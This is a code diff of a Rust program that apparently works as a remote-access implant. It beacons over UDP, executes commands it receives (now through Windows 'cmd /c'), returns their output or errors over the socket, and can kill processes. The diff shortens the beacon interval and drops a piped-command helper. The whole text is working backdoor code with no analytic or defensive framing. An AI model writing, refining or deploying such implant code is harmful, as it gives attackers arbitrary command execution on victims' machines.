@@ -8,7 +8,7 @@ use std::time;
 use std::process::{Command,Stdio,id};
 use sys_info::os_type;
 
-static mut beacontime: u64 = 20;
+static mut beacontime: u64 = 10;
 static sockettime: u64 = 25;
 
 fn main() {
@@ -81,11 +81,13 @@ fn execution(socket: &mut UdpSocket,buf: &mut [u8]) {
             socket.send(b"");
             Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
         }
-    } else if main_command.contains("|") {
-        pipedexecution(socket, main_command.to_string());
     } else {
-        if let Ok(command) = Command::new(&string2[0]).args(&string2[1..]).output() {
-            socket.send(&command.stdout);
+        if let Ok(command) = Command::new("cmd").arg("/c").arg(&string2[0]).args(&string2[1..]).output() {
+            if command.stdout.len() != 0 {
+                socket.send(&command.stdout);
+            }else {
+                socket.send(&command.stderr);
+            };
         }
         else {
             socket.send(b"");
@@ -101,21 +103,5 @@ fn sec_execution(socket: &mut UdpSocket){
     match socket.recv(&mut buf) {
         Ok(received) =>  execution(socket, &mut buf),
         Err(e) => {},
-    }
-}
-
-fn pipedexecution(socket: &mut UdpSocket,main_command: String) {
-    let string3: Vec<&str> = main_command.split("|").collect();
-    let string4: Vec<&str> = string3[0].split(" ").collect();
-    let string5: Vec<&str> = string3[1].split(" ").collect();
-    if let Ok(fp1) = Command::new(string4[0]).args(&string4[1..]).stdout(Stdio::piped()).spawn() {
-        if let Ok(fp2) = Command::new(string5[0]).args(&string5[1..]).stdin(fp1.stdout.expect("Command failed")).output() {
-            socket.send(&fp2.stdout);
-        }
-        else {
-            socket.send(b"");
-        }
-    } else {
-        socket.send(b"");
     }
 }
